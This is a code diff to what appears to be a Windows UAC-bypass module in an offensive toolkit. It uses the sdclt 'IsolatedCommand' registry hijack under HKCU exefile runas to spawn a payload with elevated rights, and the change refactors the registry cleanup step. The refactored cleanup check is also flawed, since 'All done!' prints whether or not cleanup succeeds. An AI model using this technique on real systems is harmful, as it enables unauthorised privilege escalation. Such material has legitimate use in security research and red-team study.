@@ -16,6 +16,14 @@ sdcltisolatedcommand_info = {
 }
 
 
+def sdclt_isolatedcommand_cleanup(path):
+	print_info("Performing cleaning")
+	if registry().remove_key(hkey="hkcu", path=path, name="IsolatedCommand", delete_key=False):
+		print_success("Successfully cleaned up")
+	else:
+		print_error("Unable to cleanup")
+		return False
+
 def sdclt_isolatedcommand(payload):
 	if payloads().exe(payload):
 		path = "Software\\Classes\\exefile\\shell\\runas\\command"
@@ -35,14 +43,13 @@ def sdclt_isolatedcommand(payload):
 				print_success("Successfully spawned process ({})".format(payload))
 			else:
 				print_error("Unable to spawn process ({})".format(os.path.join(payload)))
-				return False
+				if "error" in Constant.output:
+					sdclt_isolatedcommand_cleanup(path)
 
 		time.sleep(5)
 
-		if registry().remove_key(hkey="hkcu", path=path, name="IsolatedCommand", delete_key=False):
-			print_success("Successfully cleaned up, enjoy!")
-		else:
-			print_error("Unable to cleanup")
+		if not sdclt_isolatedcommand_cleanup(path):
+			print_success("All done!")
 	else:
 		print_error("Cannot proceed, invalid payload")
 		return False
